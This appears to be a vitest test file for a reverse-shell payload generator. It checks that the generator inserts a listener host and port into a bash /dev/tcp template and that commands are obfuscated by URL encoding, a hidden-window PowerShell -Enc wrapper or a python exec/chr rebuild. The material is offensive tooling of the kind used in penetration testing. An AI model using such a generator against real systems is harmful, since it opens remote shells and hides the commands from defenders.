import { describe, expect, it } from "vitest";
import { generateReverseShell, obfuscateCommand } from "./generate";
import type { ReverseShellConfig } from "./types";

const baseConfig: ReverseShellConfig = {
  templateId: "bash-dev-tcp",
  lhost: "10.0.0.5",
  lport: 4444,
  shell: "/bin/bash",
  obfuscation: "none",
};

describe("generateReverseShell", () => {
  it("renders bash reverse shell with LHOST and LPORT", () => {
    const result = generateReverseShell(baseConfig);
    expect(result.rawCommand).toContain("10.0.0.5");
    expect(result.rawCommand).toContain("4444");
    expect(result.command).toBe(result.rawCommand);
  });
});

describe("obfuscateCommand", () => {
  it("url-encodes the command", () => {
    const { command } = obfuscateCommand("bash -i", "url", "/bin/bash");
    expect(command).toBe(encodeURIComponent("bash -i"));
  });

  it("wraps with powershell -Enc for encoded mode", () => {
    const { command } = obfuscateCommand(
      "whoami",
      "powershell-encoded",
      "powershell",
    );
    expect(command).toMatch(/^powershell -NoP -NonI -W Hidden -Enc /);
  });

  it("python-chr rebuilds commands with embedded quotes", () => {
    const payload = 'python3 -c "import socket"';
    const { command } = obfuscateCommand(payload, "python-chr", "/bin/bash");
    expect(command).toMatch(/^python3 -c 'exec\(bytes\(\[/);
    const result = generateReverseShell({
      ...baseConfig,
      templateId: "python3-socket",
      obfuscation: "python-chr",
    });
    expect(result.command).toMatch(/^python3 -c 'exec\(bytes\(\[/);
    expect(result.command).not.toContain('os.system("');
  });
});
